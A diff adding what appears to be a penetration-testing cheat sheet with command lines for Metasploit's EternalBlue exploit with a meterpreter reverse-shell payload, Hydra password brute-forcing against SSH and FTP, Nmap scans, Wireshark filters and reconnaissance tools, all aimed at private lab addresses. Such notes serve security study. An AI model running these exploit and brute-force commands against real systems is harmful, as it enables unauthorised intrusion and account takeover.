@@ -1,0 +1,74 @@
+==============================
+Metasploit Commands
+==============================
+
+msfconsole
+
+search smb
+
+use exploit/windows/smb/ms17_010_eternalblue
+
+set RHOSTS 192.168.1.10
+
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+
+set LHOST 192.168.1.5
+
+run
+
+
+==============================
+Hydra Commands
+==============================
+
+hydra -L usernames.txt -P passwords.txt ssh://192.168.1.10
+
+hydra -l admin -P rockyou.txt ftp://192.168.1.10
+
+hydra -L users.txt -P pass.txt -t 4 ssh://192.168.1.10
+
+
+==============================
+Nmap Commands
+==============================
+
+nmap -sV 192.168.1.10
+
+nmap -A 192.168.1.10
+
+nmap -p- 192.168.1.10
+
+nmap -sS -T4 192.168.1.10
+
+
+==============================
+Wireshark Notes
+==============================
+
+Filter HTTP traffic:
+http
+
+Filter DNS traffic:
+dns
+
+Filter TCP packets:
+tcp
+
+Follow TCP Stream to analyze communication
+
+Analyze ARP packets for spoofing detection
+
+
+==============================
+Reconnaissance Commands
+==============================
+
+whois example.com
+
+nslookup example.com
+
+dig example.com
+
+theHarvester -d example.com -b google
+
+nmap -sn 192.168.1.0/24
